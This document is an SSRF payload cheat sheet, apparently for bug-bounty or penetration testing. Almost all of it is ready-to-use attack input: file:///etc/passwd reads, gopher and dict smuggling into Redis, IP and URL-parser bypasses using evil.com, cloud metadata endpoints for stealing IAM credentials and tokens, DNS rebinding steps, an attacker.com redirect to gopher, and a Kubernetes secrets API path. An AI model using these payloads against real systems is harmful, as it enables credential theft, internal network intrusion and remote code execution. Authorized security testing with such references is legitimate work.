# SSRF — Payload Cheatsheet

## Detection Payloads

### Basic SSRF Test
```
http://{collaborator}
https://{collaborator}
http://127.0.0.1
http://localhost
http://[::1]
```

### Protocol Smuggling
```
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
tftp://127.0.0.1:69/test
ldap://127.0.0.1:389
```

### IP Bypass Patterns
```
# Decimal IP
http://2130706433  (= 127.0.0.1)
http://0x7f000001  (hex)
http://017700000001  (octal)

# IPv6
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]

# Redirect via DNS
http://spoofed.burpcollaborator.net  (DNS pointing to 127.0.0.1)
http://127.0.0.1.nip.io
http://0.0.0.0

# URL parsing confusion
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
http://127.0.0.1%2523@evil.com
http://127.1
http://0
```

### Cloud Metadata Endpoints

#### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
http://169.254.169.254/latest/user-data
```

#### AWS (IMDSv2) — requires PUT with token
```
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
Header: X-aws-ec2-metadata-token: {token}
```

#### GCP
```
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

### Internal Service Discovery
```
http://127.0.0.1:80      # Web
http://127.0.0.1:8080    # Alt web / API
http://127.0.0.1:8443    # HTTPS alt
http://127.0.0.1:3000    # Node/Rails dev
http://127.0.0.1:5000    # Flask
http://127.0.0.1:6379    # Redis
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:27017   # MongoDB
http://127.0.0.1:5432    # PostgreSQL
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:11211   # Memcached
http://127.0.0.1:9000    # PHP-FPM
http://127.0.0.1:2375    # Docker API
http://127.0.0.1:10250   # Kubelet
http://127.0.0.1:8500    # Consul
```

## DNS Rebinding

When allowlist checks DNS at request time:
1. Set up a DNS server that alternates between attacker IP and 127.0.0.1
2. First resolution → attacker IP (passes allowlist)
3. Second resolution → 127.0.0.1 (actual request hits internal)

Tools: `rbndr.us/dnsbin`, Singularity of Origin

## Validation Criteria

SSRF confirmed when ANY of:
1. HTTP callback to collaborator server (not just DNS)
2. Internal service response data in application output
3. Cloud metadata values returned
4. File contents from file:// protocol

DNS-only resolution is NOT confirmed SSRF (see never-submit list).

## Impact Escalation

| Impact | What to demonstrate |
|--------|-------------------|
| Internal scan | Port scan results from internal network |
| Cloud creds | IAM credentials from metadata endpoint |
| Data read | Internal service data (Redis, Elasticsearch) |
| RCE | Redis SLAVEOF/eval, Gopher to internal services |
| Network pivot | Access to services not reachable from outside |

## Advanced Bypass Patterns

### DNS Rebinding Detailed
1. Register domain with short TTL (e.g., 1 second)
2. First resolution: points to allowed IP
3. Second resolution: points to internal IP (169.254.169.254, 127.0.0.1)
4. Tools: rbndr.us, rebind.it, singularity
5. Defense check: does the app re-resolve or cache DNS?

### URL Parser Differentials
- `http://evil.com#@169.254.169.254/` — fragment vs authority confusion
- `http://169.254.169.254\@evil.com/` — backslash handling differs between parsers
- `http://169.254.169.254%00@evil.com/` — null byte injection
- `http://0x7f000001/` — hex IP (127.0.0.1)
- `http://0177.0.0.1/` — octal IP
- `http://2130706433/` — decimal IP (127.0.0.1)
- `http://[::ffff:127.0.0.1]/` — IPv6 mapped IPv4
- `http://127.1/` — short form

### Cloud Metadata v2 Bypass
AWS IMDSv2 requires PUT with token header:
```
PUT /latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600

Then: GET /latest/meta-data/ with X-aws-ec2-metadata-token header
```
If the SSRF allows custom headers or HTTP method, IMDSv2 can be bypassed.
GCP: `http://metadata.google.internal/computeMetadata/v1/?recursive=true` requires `Metadata-Flavor: Google` header.

### Protocol Smuggling via Redirect
1. App fetches `http://attacker.com/redirect`
2. Server responds 302 to `gopher://internal:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a` (Redis)
3. If the HTTP library follows redirects to non-HTTP protocols → internal service access
4. Test with: file://, dict://, gopher://, tftp://, ldap://

### Kubernetes-Specific
- `http://kubernetes.default.svc/` — K8s API
- `http://10.0.0.1/` — typical cluster IP
- `http://etcd:2379/` — etcd in some clusters
- `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` with service account token
